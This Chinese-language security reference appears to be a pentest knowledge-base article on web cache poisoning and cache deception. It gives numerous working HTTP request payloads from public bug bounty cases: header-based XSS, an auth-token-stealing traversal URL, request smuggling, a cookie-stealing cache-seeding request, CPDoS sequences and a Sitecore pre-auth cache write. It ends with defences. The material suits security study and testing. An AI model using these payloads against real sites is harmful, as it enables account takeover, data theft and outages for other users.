---
attack_surface:
  - 缓存/代理逻辑
  - 协议解析差异
  - 配置缺陷
impact:
  - 信息泄露
  - 远程代码执行
  - 可用性破坏
risk_level: 高
prerequisites:
  - HTTP 缓存机制（Cache-Control、Vary、Age）
  - CDN / 反向代理架构
  - Web 框架基础（Rails、Spring、Django）
related_techniques:
  - http-request-smuggling
  - hop-by-hop-headers
  - open-redirect
  - xss
  - cspt
difficulty: 高级
tools:
  - param-miner
  - wcvs
  - cachedecephound
  - toxicache
---

# Web Cache Poisoning & Cache Deception — 缓存投毒与缓存欺骗全矩阵

> 关联文档：[Special HTTP Headers](../../Web%20Servers%20&%20Middleware/Special%20HTTP%20Headers/README.md) · [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Abusing Hop-by-Hop Headers](../Abusing%20hop-by-hop%20headers/README.md) · [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md) · [URL 路径解析差异](./URL%20路径解析差异.md)

---

### 知识路径

```
Cache Poisoning & Deception（本文档）
  ├── 前置知识：HTTP 缓存机制 — Cache-Control, Vary, Age, ETag
  ├── 前置知识：CDN 架构 — 边缘节点、源站、缓存键策略
  ├── 进阶：缓存键/非键分析 → Param Miner 自动化探测
  ├── 进阶：分隔符/规范化差异 → 参数隐藏 (Parameter Cloaking)
  ├── 进阶：CPDoS — 缓存投毒导致拒绝服务
  ├── 关联：HTTP Request Smuggling → 缓存投毒链
  ├── 关联：Hop-by-Hop Headers → 缓存键操控
  └── 关联：CSPT → 认证凭据缓存窃取
```

---

# 0x01 原理 — 两个概念的区别

> **Web Cache Poisoning（缓存投毒）与 Web Cache Deception（缓存欺骗）有什么区别？**
>
> - **缓存投毒**：攻击者使应用在缓存中存储**恶意内容**，该内容从缓存中提供给其他用户。
> - **缓存欺骗**：攻击者使应用在缓存中存储**属于其他用户的敏感内容**，攻击者随后从缓存中获取此内容。

核心三方角色：**客户端** → **缓存层（CDN/代理）** → **后端源站（Origin）**。两类攻击都利用了三者之间的认知不一致。

## 1.1 缓存投毒攻击逻辑

1. **发送恶意请求**：攻击者发送包含"非缓存键"输入的请求（如 `X-Forwarded-Host: evil.com`）
2. **后端产生恶意响应**：后端信任此输入并将其反射到响应中
3. **缓存存入**：缓存服务器按缓存键（通常 `Method + Host + Path`）存储该恶意响应
4. **受害者中招**：普通用户访问同一缓存键 → 缓存命中 → 返回恶意内容

**关键概念**：
- **Keyed Input（缓存键）**：参与缓存键构建的字段（如 Host、Path、特定 Query 参数）
- **Unkeyed Input（非缓存键）**：不参与键构建但能改变响应的字段（如特定 Header）

## 1.2 缓存欺骗攻击逻辑

1. **构造特殊路径**：诱导受害者访问 `https://target.com/api/user/settings/avatar.jpg`
2. **认知偏差**：
   - 缓存层看到 `.jpg` 后缀 → 视为静态资源 → 缓存
   - 后端忽略不存在的后缀 → 响应对 `/api/user/settings` 的实际内容
3. **响应缓存**：CDN 将受害者私密 JSON 作为"图片"存入缓存
4. **攻击者窃取**：攻击者访问同一路径 → 从缓存中获取受害者的私密数据

---

# 0x02 第一阶段：识别缓存机制

## 2.1 有缓存提示（指示性 Header）

| Header | 含义 |
|--------|------|
| `X-Cache: hit` | 响应由缓存直接返回 |
| `X-Cache: miss` | 未命中，已回源 |
| `Cf-Cache-Status: HIT` | Cloudflare 缓存命中 |
| `Age: 1800` | 资源在缓存中已存在 1800 秒 |
| `Cache-Control: public, max-age=1800` | 可缓存，有效期 1800 秒 |
| `Server-Timing: cdn-cache; desc=HIT` | CDN 级缓存命中 |
| `Server: cloudflare` / `Via: varnish` | 缓存架构指纹 |

## 2.2 无缓存提示（行为探测）

**错误诱导测试**：发送非法 Header 强制触发 `400 Bad Request` → 立即再次正常访问 → 若也返回 `400` → 错误响应已被缓存。

## 2.3 Vary 头

`Vary` 指示额外的 Header 也被视为缓存键的一部分。即使该头通常是 Unkeyed，如果它出现在 `Vary` 列表中，就必须匹配才能命中缓存。例如 `Vary: User-Agent` 意味着需要与受害者使用相同的 UA 才能命中投毒缓存。

---

# 0x03 第二阶段：识别缓存键与非缓存键

使用 [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) 自动探测。

## 3.1 识别缓存键

- **参数探测法**：改变 Query 参数（如 `?cb=123`）→ 若导致 `miss` → 再请求变 `hit` → 该参数是缓存键
- **分块解析测试**：测试 `;` 或 `?` 是否导致缓存/后端路径解析不一致

## 3.2 识别非缓存键

寻找能改变页面内容但不改变缓存键的隐藏变量：

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

若响应中出现 `evil.com`（反射成功）且 `X-Cache: hit`（未改变 Key），则找到非缓存键。

**常见非缓存键**：`X-Forwarded-Host`、`X-Forwarded-Scheme`、`X-HTTP-Method-Override`、`Content-Type`、`User-Agent`

---

# 0x04 基础缓存投毒案例分析

## 4.1 HackerOne 全局重定向 via `X-Forwarded-Host`

后端使用 `X-Forwarded-Host` 进行重定向和 URL 规范化，但缓存键仅使用 `Host` 头。单个响应即可毒害所有访问 `/` 的访客：

```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```

立即不带伪造头重新访问 `/`——若重定向持续，则获得了全局 Host 伪造原语。HackerOne 支付了该漏洞 $100K+。

## 4.2 HackerOne 静态资源投毒 via `X-Forwarded-Scheme`

```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```

Rails 的 Rack 中间件信任 `X-Forwarded-Scheme` 决定是否强制 HTTPS。伪造 `http` 触发可缓存的 301 重定向 → 所有用户接收重定向而非资源。

## 4.3 Red Hat Open Graph meta 投毒

Red Hat 页面为 SEO 动态生成 Open Graph 标签。后端信任 `X-Forwarded-Host` 并直接拼接到 `<meta property="og:url">` 中，无过滤：

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```

反射的 HTML 注入被 CDN 缓存后变为存储型 XSS。社交媒体爬虫消费缓存的 Open Graph 标签，将 payload 分发至远超出直接访问者的范围。

## 4.4 `X-Host` — JS 资源域名劫持

`X-Host` 头被用作加载 JS 资源的域名：

```http
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

注意：若响应含 `Vary: User-Agent`，则需匹配受害者的 UA 才能命中。

---

# 0x05 内容处理滥用案例

## 5.1 GitHub 匿名用户全局 DoS via `Content-Type` + `PURGE`

**关键前提**：GitHub 对匿名用户的缓存**仅键控路径**（不含 Cookie），而已登录用户含 Session。这意味着所有匿名用户共享同一缓存桶。

1. 通过 `PURGE` 清除健康缓存：
```bash
curl -X PURGE https://github.com/user/repo
```

2. 发送非法 `Content-Type` 触发 `400` 错误：
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
```

由于匿名用户共享缓存，**一次投毒影响该仓库所有未登录访问者**。GitHub（理论上）不应当允许 `PURGE` 方法，这是意外的攻击面暴露。

## 5.2 GitLab 静态资源 DoS via `X-HTTP-Method-Override`

GitLab 从 Google Cloud Storage 提供静态 bundle。GCS 遵从 `X-HTTP-Method-Override` 将 `GET` 覆盖为 `HEAD`，返回 `200 OK` + `Content-Length: 0`。边缘缓存忽略 HTTP 方法差异，用空 body 替换 JS 包：

```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```

一次请求使所有用户失去 JS 功能，UI 全面瘫痪。

## 5.3 Shopify 跨域持久化循环

多层缓存系统有时需要多次相同请求才提交新对象。Shopify 将同一缓存跨多个本地化主机复用，持久化意味着影响大量域。

```python
import requests, time
for i in range(100):
    requests.get("https://shop.shopify.com/endpoint",
                 headers={"X-Forwarded-Host": "attacker.com"})
    time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```

`hit` 后爬取共享同一缓存命名空间的其他主机/资源以证明跨域爆炸半径。

---

# 0x06 底层解析差异

## 6.1 分隔符差异 — Parameter Cloaking

Ruby (Rack)、Java Spring 等框架将 `;` 解释为参数分隔符（等价于 `&`），但**大多数缓存服务器不解释 `;`**。

**PortSwigger 靶场案例**（缓存排除 `utm_content` 参数，后端 Ruby）：

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
```

| 层 | 解析 | 结果 |
|----|------|------|
| **缓存** | `utm_content` 不参与键控 → 忽略其中的 `;callback=...` | 缓存键 = `callback=setCountryCookie` |
| **Ruby** | `;`=分隔符 → `callback` 出现两次 → 取最后一个 | 响应使用 `arbitraryFunction` |

核心原理：**利用 `;` 在非键控参数内部走私重复的键控参数**，使后端取最后一个值但缓存键不变。

靶场：[portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

## 6.2 URL 规范化差异 — ChatGPT 账户接管（Wildcard Web Cache Deception）

**案例来源**：nokline 报告，赏金 $6,500。这是 **Web Cache Deception**（缓存欺骗），不是投毒——受害者的敏感数据被缓存，攻击者再读取。

### 发现过程：通配缓存规则

ChatGPT 实现了"分享"功能（`/share/` 路径），允许用户公开分享对话。在测试过程中发现：

1. 与 ChatGPT 继续对话后，分享链接的内容**不更新**——这是缓存行为的症状
2. 检查响应头：`Cf-Cache-Status: HIT`（Cloudflare 缓存命中）
3. 验证：`/share/random-path-that-does-not-exist` 也被缓存

**结论**：Cloudflare 配置了一条通配缓存规则 `/share/*` —— **任何**以 `/share/` 开头的路径都会被 CDN 缓存，无论内容类型、无论文件扩展名。这是一个极其危险的宽松规则。

### 攻击链：URL 编码路径遍历

**关键不一致**：请求经过两步 URL 解析——CDN 解析一次，源站 Web 服务器再解析一次：

| 层 | 对 `%2F..%2F` 的处理 | 结果 |
|----|---------------------|------|
| **Cloudflare CDN** | **不解码**，**不规范化** `%2F..%2F` | 视为纯字符串 → 匹配 `/share/*` 规则 → 缓存 |
| **Origin Web Server** | **解码** `%2F` → `/`，**规范化** `..` 进行路径遍历 | 实际解析为 `/api/auth/session` |

**Payload**：

```
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```

### 分步拆解

**第 1 步**：受害者访问恶意链接（攻击者通过社工发送，或嵌入钓鱼页面）

```
GET /share/%2F..%2Fapi/auth/session?cachebuster=123 HTTP/1.1
Host: chat.openai.com
Cookie: <受害者的认证 Cookie>
```

**第 2 步**：CDN 处理
- 看到路径以 `/share/` 开头 → 匹配 `/share/*` 通配缓存规则
- 不解码 `%2F`，不规范化 `..` → 视为原始字符串
- 将请求转发给源站、缓存源站的响应，缓存键为 `/share/%2F..%2Fapi/auth/session?cachebuster=123`

**第 3 步**：源站处理
- 解码 `%2F` → `/` + 规范化路径遍历 → 实际路径 = `/api/auth/session`
- 受害者认证 Cookie 随请求发送 → 源站返回**包含受害者 auth token 的 JSON**
- 响应内容被 CDN 缓存

**第 4 步**：攻击者检索
- 攻击者访问同一 URL：`https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- CDN 缓存命中 → 直接返回缓存的响应 → 攻击者获取受害者 auth token
- 使用 auth token → **完整账户接管**（查看对话、账单信息、API 密钥）

### 为什么是 Wildcard

与普通 Web Cache Deception（需要追加 `.css`/`.js` 等静态扩展名）不同，这里的 `/share/*` 规则完全不检查扩展名。只要路径以 `/share/` 开头就缓存——路径遍历可以逃逸到服务器上的**任意端点**，使任何敏感 API（`/api/auth/session`、`/api/user/profile` 等）都能被缓存。

### 关键要点

- 通配缓存规则（`/share/*`）比扩展名规则（`*.css`）危险得多——不需要静态扩展名伪装
- CDN 和源站的 URL 解析分歧是 Deception 的核心：CDN 认为资源在 `/share/` 下（可缓存），源站实际处理的是 `/api/auth/session`（敏感端点）
- `cachebuster=123` 用于确保缓存的是攻击者控制的版本，不与正常访问者的缓存混淆

> **分隔符速查表**：
> | 字符 | 框架 | 效果 |
> |------|------|------|
> | `;` | Ruby Rack, Spring | 参数分隔符（= `&`） |
> | `.` | Rails | 响应格式指定（`/MyAccount.css` → `/MyAccount`） |
> | `%00` | OpenLiteSpeed | 路径截断（`/MyAccount%00aaa` → `/MyAccount`） |
> | `%0a` | Nginx | URL 组件分隔 |

## 6.3 大小写混淆 — Cloudflare Host 规范化

Cloudflare 对 `Host` 头**规范化**（统一小写）生成缓存键，但**原始大小写**转发至源站：

```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```

- 缓存键：`target.com`（小写规范化）
- 源站看到：`TaRgEt.CoM`（原始混合大小写）

若源站路由逻辑对大小写敏感，可触发替代行为 → 混合大小写的响应填充了规范小写的缓存桶。

## 6.4 编码差异 — Injecting Keyed Parameters

Fastly 的 Varnish 将 `size` 参数纳入缓存键，但 **URL 编码后的同一参数**（`siz%65`）被缓存忽略而被后端处理：

```
GET /?size=100&siz%65=0
```

- 缓存键 = `size=100`
- 后端处理 `size=0`（来自 `siz%65`）→ 返回 400 错误
- 400 响应被缓存 → DoS

---

# 0x07 缓存投毒到 DoS (CPDoS)

> **CPDoS 核心**：使源站返回**错误、空白 Body 或中断的重定向**，同时缓存仍认为该响应有效并缓存。一旦存储，毒化对象可拒绝所有命中同一缓存键的用户访问。
>
> **共同前提**：所有 CPDoS 向量（HHO/HMC/HMO）均依赖攻击者注入的头部**不参与缓存键**——否则异常响应只存入攻击者独有的缓存键位，无法影响其他用户。且要求缓存对异常信号的**容忍度高于源站**——缓存能接受（转发）的值，源站接受不了（崩溃）。

## 7.1 快速验证流程

```bash
url='https://target.tld/app.js'

# 1) 基线
curl -isk "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'

# 2) 投毒尝试
curl -isk -H 'X-HTTP-Method-Override: HEAD' "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'

# 3) 验证
curl -isk "$url" | egrep -i '^(HTTP/|x-cache:|cf-cache-status:|cache-status:|age:|content-length:)'
```

## 7.2 HTTP Header Oversize (HHO)

发送一个**缓存接受但源站拒绝**的超大头块。若结果 4xx 被缓存，后续正常请求将获取缓存错误：

```http
GET / HTTP/1.1
Host: redacted.com
X-Oversized-Header: Big-Value-00000000000000000000000000000000000000000000000000
```

CDN/Header 上限 > 源站/框架上限时尤其有效。

## 7.3 HTTP Meta Character (HMC)

HMC 依赖两个条件的交集：

1. **该头不参与缓存键**（Unkeyed）——攻击者发送的异常头不影响缓存键，因此毒化响应存入的是正常键位，而非仅攻击者可见的独立键位
2. **容忍度不对称**——**缓存接受但源站拒绝**。同样的控制字符（`\0`、`\b`、`\r`、`\n`），CDN 的宽松解析器放行并转发，源站 RFC 严格解析器拒绝并返回异常

仅条件 1（Unkeyed）或仅条件 2（不对称）都不构成 HMC——必须两者叠加：异常头不被键控以确保污染所有人的缓存桶，且 CDN 和源站的接受度差异确保异常响应被生成并存回同一桶。

具体 payload：

```http
GET / HTTP/1.1
Host: redacted.com
X-Metachar-Header: \0
```

```http
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```

错误配置的解析器也可能因 `\:`、`\x` 等值失败。

## 7.4 HTTP Method Override (HMO)

若应用支持方法覆盖头（`X-HTTP-Method-Override`、`X-HTTP-Method`、`X-Method-Override`），可将 `GET` 覆盖为无 Body 的方法：

```http
GET /app.js HTTP/1.1
Host: redacted.com
X-HTTP-Method-Override: HEAD
```

`HEAD` 尤其有效——部分技术栈返回 `200 OK` + `Content-Length: 0`，为所有人清空资源。同时测试 `TRACE`、`PUT`、`DELETE`、`POST`。

## 7.5 其他 DoS 向量

**Unkeyed Header 触发错误**：

```http
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
X-Cache: hit
Invalid Header
```

**Unkeyed Port** — 反射到重定向目标中：

```http
GET /index.html HTTP/1.1
Host: redacted.com:1
→ 301 Location: https://redacted.com:1/en/index.html
```

**Long Redirect DoS** — unkeyed 参数注入超长 URL 导致 `414 URI Too Large`。

**Fat GET** — GET 带 body，源站拒绝但缓存键基于 URL。

**内部框架缓存投毒** — Next.js 等现代框架的内部/ISR 缓存可被强制存储 `204 No Content` 或 `Content-Length: 0`，无需传统错误页即可清空 HTML 或 JS。

---

# 0x08 Fat GET 与参数操控

## 8.1 Fat GET

GET 请求同时携带 URL 参数和 Body 参数，缓存使用 URL 参数，后端使用 Body 参数：

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

- 缓存键：`report=albinowax`
- 后端处理：`report=innocent-victim`

靶场：[portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

## 8.2 Cookie 反射投毒

```http
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO...; fehost=asd"%2balert(1)%2b"
```

若 Cookie 值被反射到响应中且可被 XSS 利用，则可投毒缓存。注意：常用 Cookie 的正则请求会频繁清理缓存。

---

# 0x09 高级复合攻击

## 9.1 HTTP Request Smuggling + 缓存投毒

通过走私漏洞将恶意响应"对齐"到正常用户的缓存键上：

```http
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

走私后立即访问 `/static/include.js` → 对 `/static/include.js` 的任何后续请求返回 302 重定向到攻击者脚本。

## 9.2 并行请求播种 (Cache Seeding)

### 威胁模型

缓存播种（Cache Seeding）利用 CDN 并发处理请求时的时序竞争，将**未缓存键控制的响应**错误地关联到**正常请求的缓存键**上。攻击需要三个前提：

1. 存在一个**反射型 XSS 向量**（如 `User-Agent` 头反射到响应中），且该头**不参与缓存键**
2. CDN 配置了**基于扩展名/路径的自动缓存规则**（如 `.js` 后缀默认缓存）
3. 攻击者能**并发发送请求**，竞争 CDN 内部的缓存槽位分配

### 攻击机制

CDN 在处理并发请求时，内部流程大致为：

1. 收到请求 A → 检查缓存键 → 未命中 → 向源站发起回源请求 → 等待响应
2. 收到请求 B → 检查缓存键 → 未命中 → 向源站发起回源请求 → 等待响应

在高并发且 CDN 的缓存槽位锁机制不健壮时，可能出现以下竞态：

- 请求 A（`GET /index.php/script.js`，带恶意 `User-Agent: "><script>stealCookies()</script>`）
  - CDN 看到 `.js` 后缀 → 标记为"可缓存"
  - 向源站发起回源
- 请求 B（`GET /`，正常请求，无特殊 UA）
  - CDN 看到 `/` → 同样是可缓存页面
  - 几乎同时向源站发起回源

**竞争点**：两个响应几乎同时从源站返回。如果 CDN 在处理时未正确隔离两个缓存槽位的写入操作，可能出现：

> 请求 A（带恶意 UA → 源站返回含 XSS 的网页）的响应体被错误地写入请求 B（`/` 缓存键）的缓存槽

结果：访问首页 `/` 的所有用户获得包含恶意反射 XSS 的响应——攻击者将带毒的响应"播种"到了与攻击请求不同的缓存键中。

### PortSwigger 靶场示例

PortSwigger Web Security Academy 有专门的缓存播种实验。典型场景：

1. 目标站点将 `User-Agent` 反射到页面中且不参与缓存键
2. CDN 配置自动缓存所有 `.js` 结尾的 URL
3. 攻击路径：`/index.php/script.js` → 源站忽略 `/script.js` → 响应实际是 `/index.php` 内容
4. 通过单包并发（Single-packet attack）同时发送：
   - 请求 A：`GET /index.php/script.js` + 恶意 UA（含 XSS payload）
   - 请求 B：`GET /`（普通 UA，模拟正常用户）
5. 竞态导致请求 A 的毒化响应被写入请求 B 的缓存槽 → 首页被全局投毒

```http
# 请求 A — 向毒化源站，带恶意 UA（被反射到响应中）
GET /index.php/script.js HTTP/1.1
Host: cdn.target.com
User-Agent: "><script>stealCookies()</script>

# 请求 B — 同时发送的清理请求，目标是首页缓存
GET / HTTP/1.1
Host: cdn.target.com
User-Agent: Mozilla/5.0 (normal browser)
```

使用 Burp Suite 的 "Send group in parallel (single-packet attack)" 模式实现两者同时发送到 CDN。

> **真实案例参考**：PortSwigger 研究团队在 [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning) 中首次描述了该技术。虽未披露具体受影响企业，但该技术已在多个漏洞赏金项目中成功利用，目标包括使用了基于扩展名的激进缓存策略（如缓存所有 `.js`/`.css`/`.png` URL）的 CDN 部署。

## 9.3 Sitecore XAML 预认证投毒 → RCE

直接利用 Sitecore 框架内部的预认证 RPC，主动写入服务器内存缓存：

```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```

攻击入口：`/-/xaml/Sitecore.Shell.Xaml.WebControl`（预认证可访问）。利用原语：`AjaxScriptManager` 允许通过 HTTP 参数触发 `AddToCache("key", "value")`，攻击者手动构建缓存键并写入恶意 HTML。

## 9.4 CSPT + 缓存欺骗 → 账户接管

结合 Client-Side Path Traversal 与扩展名缓存：

1. 敏感端点 `/v1/token` 需要 `X-Auth-Token` 头，Origin 正确标记为 `no-cache`
2. 追加 `.css` 后缀 → `/v1/token.css` → CDN 视为静态资源 → `Cache-Control: public, max-age=86400`
3. SPA 存在 CSPT：将用户控制路径拼入 API URL 同时附加认证头 → 注入 `../` 遍历 → 请求重定向至 `/v1/token.css`
4. CDN 缓存受害者 Token JSON → 攻击者无需认证直接访问同一路径获取 Token

```js
// 脆弱 SPA 代码：
const apiUrl = `https://api.example.com/v1/users/info/${userId}`;
fetch(apiUrl, { headers: { 'X-Auth-Token': authToken } });
```

利用：`https://example.com/user?userId=../../../v1/token.css` → 认证 fetch 遍历至 `/v1/token.css` → CDN 缓存 → 公开可访问。

---

# 0x10 缓存欺骗详解

## 10.1 核心原理

缓存服务器通常配置为缓存特定扩展名（`.css`、`.js`、`.png` 等）的请求，而某些 Web 框架（Django、Spring）会忽略不存在的路径后缀，响应实际内容。

**经典案例**：

```
GET /profile.php/nonexistent.css HTTP/1.1
Host: target.com
```

- 缓存看到 `.css` → 视为静态资源 → 缓存
- 后端忽略 `/nonexistent.css` → 响应 `/profile.php` 内容（含用户敏感信息）
- 攻击者直接访问同一 URL → 从缓存获取受害者的私密数据

## 10.2 测试路径变体

```
/profile.php/.js
/profile.php/.css
/profile.php/test.js
/profile.php/../test.js
/profile.php/%2e%2e/test.js
/profile.php;admin.js
```

**冷门扩展名**：`.avif`、`.webp`、`.woff2` —— CDN 可能默认缓存但安全策略未覆盖。

**静态目录 + 点段**：

```
/static/..%2Fhome        → 缓存键 /static/..%2Fhome → 响应 /home
/home/..%2fstatic/something → 缓存键 /static/something → 响应 /home
```

**静态文件**：`/robots.txt`、`/favicon.ico`、`/index.html` 通常始终被缓存：
```
/home/..%2Frobots.txt     → 缓存键 /robots.txt → 响应 /home
```

## 10.3 HackerOne 报告 593712（经典案例）

访问不存在的页面 `http://www.example.com/home.php/non-existent.css` 时，返回的是 `home.php` 的内容（含用户敏感信息）且被缓存服务器保存。攻击者之后访问同一 URL 即可窥探之前用户的私密数据。注意：缓存代理需基于**文件扩展名**缓存，而非 Content-Type（响应仍是 `text/html`）。

---

# 0x11 漏洞案例速查

| 案例 | 向量 | 影响 |
|------|------|------|
| CVE-2021-27577 (Apache Traffic Server) | URL Fragment 未剥离 | 缓存键不含 `#` 后的 payload，但后端处理之 → 缓存投毒 |
| Cloudflare 403 缓存 | 错误 Authorization 头 → S3/Azure 返回 403 → Cloudflare 缓存 | 已知漏洞（已修复），其他代理可能仍受影响 |
| Akamai 非法 Header 字符 | RFC 7230 tchar 范围外的字符（如 `\`）→ 400 → 缓存 | 无 `cache-control` 头时生效 |
| User-Agent 规则反噬 | 封禁 FFUF/Nuclei UA 的反向规则 → 封禁响应被缓存 | 安全措施本身引入漏洞 |

---

# 0x12 防御

| 措施 | 理由 |
|------|------|
| 不要让 Unkeyed Inputs 影响响应内容——如果必须，将其设为缓存键 | 消除非键输入的投毒面 |
| 缓存层规范化所有缓存键输入（小写、URL 解码）后再构建键 | 消除大小写/编码差异 |
| 限制静态缓存规则仅匹配真正静态的内容——不在动态路径上启用扩展名缓存 | 防止缓存欺骗 |
| `Vary` 头正确声明所有影响响应的 Header | 防止 UA/其他头的键面扩大 |
| 禁用不必要的 HTTP 方法（`PURGE`、`TRACE`） | 消除缓存维护动词的滥用 |
| 源站对非法 Header 返回 `500` 而非 `400`——大多数缓存服务器不缓存 5xx | 防止 CPDoS |
| 限制方法覆盖头（`X-HTTP-Method-Override`）仅在有意义的端点上，或完全禁用 | 防止 HMO DoS |
| 使用 [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) 自动检测 | 自动化防护 |

## 参考资料

- [PortSwigger — Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger — Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [PortSwigger Research — Responsible DoS with Web Cache Poisoning](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)
- [PortSwigger Research — Gotta Cache 'em All](https://portswigger.net/research/gotta-cache-em-all)
- [Herish.me — Cache Poisoning Case Studies Part 1](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)
- [nokline — ChatGPT ATO via Cache Poisoning](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [watchTowr Labs — Sitecore XP Cache Poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [HackerOne Report 593712 — Cache Deception](https://hackerone.com/reports/593712)
- [Cache Deception + CSPT: Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [youst.in — Cache Poisoning at Scale](https://youst.in/posts/cache-poisoning-at-scale/)
